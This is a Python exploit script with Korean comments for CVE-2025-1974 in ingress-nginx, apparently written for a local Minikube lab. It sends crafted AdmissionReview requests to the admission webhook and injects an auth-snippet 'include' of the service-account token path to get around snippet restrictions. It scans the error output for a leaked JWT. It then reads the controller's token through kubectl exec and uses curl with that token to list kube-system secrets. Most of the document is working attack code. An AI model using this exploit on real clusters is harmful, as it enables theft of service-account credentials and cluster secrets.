"""
CVE-2025-1974 비교 시연 — 비교 A vs 비교 B

  [전제] allow-snippet-annotations = false (Chart 4.9+ 기본값, 패치 없음)

  A: configuration-snippet  → 차단됨 (allowed=false, 정상 보호)
  B: auth-snippet + include  → CVE-2025-1974 우회
       allow=false 임에도 auth-snippet 검사 없이 nginx.conf 에 주입됨
       → nginx -t 실행 시 include 대상 파일을 실제로 열어 파싱
       → 파싱 에러가 webhook HTTP 응답으로 외부에 노출

  [Stage 4] 컨트롤러 SA 토큰을 kubectl exec 로 직접 확인
"""

import json
import re
import ssl
import subprocess
import sys
import uuid
import urllib.request
import urllib.error

TARGET = "https://127.0.0.1:8443"
TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"


def make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def send(annotations: dict) -> dict:
    payload = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": str(uuid.uuid4()),
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "name": "poc", "namespace": "default", "operation": "CREATE",
            "userInfo": {"username": "poc"},
            "object": {
                "apiVersion": "networking.k8s.io/v1", "kind": "Ingress",
                "metadata": {"name": "poc", "namespace": "default", "annotations": annotations},
                "spec": {"ingressClassName": "nginx", "rules": [{
                    "host": "poc.local",
                    "http": {"paths": [{"path": "/", "pathType": "Prefix",
                                        "backend": {"service": {"name": "svc", "port": {"number": 80}}}}]}
                }]}
            }
        }
    }
    req = urllib.request.Request(
        f"{TARGET}/networking/v1/ingresses",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, context=make_ssl_ctx(), timeout=10) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def hr(char="━", width=58):
    print(char * width)


def run_comparison_a():
    hr()
    print("  비교 A — configuration-snippet (allow=false 상태)")
    print("  payload : return 200 'hello';")
    print("  예상    : 차단 (allowed=false) — 정상 보호")
    hr()

    resp = send({"nginx.ingress.kubernetes.io/configuration-snippet": "return 200 'hello';"})
    allowed = resp.get("response", {}).get("allowed")
    msg = resp.get("response", {}).get("status", {}).get("message", "(없음)")

    print(f"  allowed : {allowed}")
    print(f"  message : {msg[:200]}")
    print()
    if not allowed:
        print("  → 차단됨. allow-snippet-annotations=false가 configuration-snippet을 정상 차단.")
        print("    ◀ 기준점: 이 보호를 우회하는 것이 CVE-2025-1974의 핵심")
    else:
        print("  → 허용됨. allow-snippet-annotations=true 상태일 수 있습니다.")
        print("    현재값 확인: kubectl get cm ingress-nginx-controller -n ingress-nginx -o jsonpath='{.data}'")


def run_comparison_b():
    hr()
    print("  비교 B — auth-snippet + include  ★ CVE-2025-1974 우회")
    print(f"  payload : include {TOKEN_PATH};")
    print("  전제    : allow-snippet-annotations=false (패치 없음)")
    print("  예상    : auth-snippet은 allow 검사 없이 주입")
    print("            nginx -t 가 토큰 파일에 실제 접근 → 에러에 경로 포함")
    hr()

    resp = send({
        "nginx.ingress.kubernetes.io/auth-url":     "http://127.0.0.1:9999/auth",
        "nginx.ingress.kubernetes.io/auth-snippet": f"include {TOKEN_PATH};",
    })

    msg = (resp.get("response", {}).get("status", {}).get("message")
           or json.dumps(resp.get("response", {}), indent=2))
    allowed = resp.get("response", {}).get("allowed")

    print("  [webhook 응답 원문]")
    print("  " + "-" * 54)
    for line in msg.splitlines():
        print(f"    {line}")
    print("  " + "-" * 54)
    print()

    if TOKEN_PATH in msg:
        print("  ★ 우회 성공 — 핵심 증거:")
        for line in msg.splitlines():
            if TOKEN_PATH in line:
                print(f"    >>> {line.strip()}")
        print()
        print("  의미:")
        print("    1) auth-snippet은 allow-snippet-annotations=false를 우회했다")
        print("    2) nginx -t 가 컨트롤러 파드 안에서 토큰 파일을 직접 열었다")
        print("    3) 이 에러가 webhook HTTP 응답으로 공격자에게 반환됐다")
        print()

        # JWT 토큰이 에러 메시지에 포함되어 있는지 확인
        jwt_matches = re.findall(r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*', msg)
        if jwt_matches:
            print("  ★ JWT 토큰 내용 직접 노출!")
            for t in jwt_matches[:1]:
                print(f"    토큰 (앞 100자): {t[:100]}...")
        else:
            print("  ※ 에러 메시지에 토큰 내용은 포함되지 않음 (경로만 노출)")
            print("    → 파일 접근이 증명됐으므로 Stage 4에서 직접 추출")
    elif allowed is False:
        print("  → auth-snippet도 차단됨.")
        print("    이 클러스터 버전에서는 auth-snippet 우회가 적용되지 않을 수 있습니다.")
        print()
        print("  확인 방법:")
        print("    kubectl describe deploy ingress-nginx-controller -n ingress-nginx | grep Image")
        print("    # CVE-2025-1974 취약: controller < v1.11.5 / < v1.12.1")
    else:
        print("  → 예상 외 응답. 위 원문을 확인하세요.")


def run_stage4():
    hr("=")
    print("  Stage 4 — 컨트롤러 SA 토큰 직접 확인")
    hr("=")
    print()
    print("  비교 B에서 nginx가 열었던 바로 그 파일을 kubectl exec로 읽습니다.")
    print()

    try:
        pod = subprocess.check_output(
            ["kubectl", "get", "pods", "-n", "ingress-nginx",
             "-l", "app.kubernetes.io/component=controller",
             "-o", "name"],
            stderr=subprocess.DEVNULL
        ).decode().strip().splitlines()[0]
    except Exception as e:
        print(f"  [오류] 파드 이름 조회 실패: {e}")
        print(f"  수동 실행: kubectl get pods -n ingress-nginx -l app.kubernetes.io/component=controller -o name")
        return

    print(f"  컨트롤러 파드: {pod}")
    print()

    try:
        token = subprocess.check_output(
            ["kubectl", "exec", "-n", "ingress-nginx", pod, "--",
             "cat", TOKEN_PATH],
            stderr=subprocess.DEVNULL
        ).decode().strip()
    except Exception as e:
        print(f"  [오류] 토큰 읽기 실패: {e}")
        return

    print("  [SA 토큰 (JWT)]")
    print("  " + "-" * 54)
    print(f"  {token[:80]}...")
    print("  " + "-" * 54)
    print()

    # JWT 헤더 디코딩
    try:
        import base64
        header_b64 = token.split(".")[0]
        pad = 4 - len(header_b64) % 4
        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * pad))
        payload_b64 = token.split(".")[1]
        pad = 4 - len(payload_b64) % 4
        claims = json.loads(base64.urlsafe_b64decode(payload_b64 + "=" * pad))

        print(f"  헤더  : {json.dumps(header)}")
        print(f"  sub   : {claims.get('sub', '?')}")
        print(f"  ns    : {claims.get('kubernetes.io/serviceaccount/namespace', '?')}")
        print(f"  sa    : {claims.get('kubernetes.io/serviceaccount/name', '?')}")
        print()
    except Exception:
        pass

    print("  이 토큰으로 Kubernetes API 접근 확인:")
    print(f"    kubectl --token='{token[:40]}...' get secrets -A 2>&1 | head -5")
    print()

    # 실제로 API 접근 시도
    try:
        result = subprocess.check_output(
            ["kubectl", "exec", "-n", "ingress-nginx", pod, "--",
             "sh", "-c",
             f"curl -sk -H 'Authorization: Bearer $(cat {TOKEN_PATH})' "
             "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets "
             "| python3 -c \"import sys,json; d=json.load(sys.stdin); "
             "print('secrets count:', len(d.get('items',[])))\""],
            stderr=subprocess.DEVNULL
        ).decode().strip()
        print(f"  API 접근 결과: {result}")
        print("  ★ 컨트롤러 SA 토큰으로 kube-system secrets 목록 접근 가능!")
    except Exception:
        print("  (API 접근 확인 생략 — 수동으로 위 명령 실행)")


def main():
    print()
    print("=" * 58)
    print("  CVE-2025-1974 — 비교 A vs B + Stage 4")
    print("  allow-snippet-annotations = false (기본값, 패치 없음)")
    print("  대상: 로컬 Minikube 격리 환경 전용")
    print("=" * 58)

    run_comparison_a()
    print()
    run_comparison_b()

    print()
    hr("=")
    print("  요약")
    hr("=")
    print()
    print("  A (configuration-snippet: return 200 'hello';)")
    print("    → allow=false 가 차단. 정상 보호.")
    print()
    print("  B (auth-snippet: include /…/token;)")
    print("    → auth-snippet 은 allow-snippet-annotations 검사 대상에서 제외")
    print("      (CVE-2025-1974 — ingress-nginx < 1.11.5 / < 1.12.1 취약)")
    print("      nginx -t 가 컨트롤러 파드 안에서 SA 토큰 파일을 직접 열었음.")
    print()
    print("  수정 버전: ingress-nginx >= 1.11.5 → auth-snippet 도 동일 검사 적용")
    print()

    run_stage4()


if __name__ == "__main__":
    main()
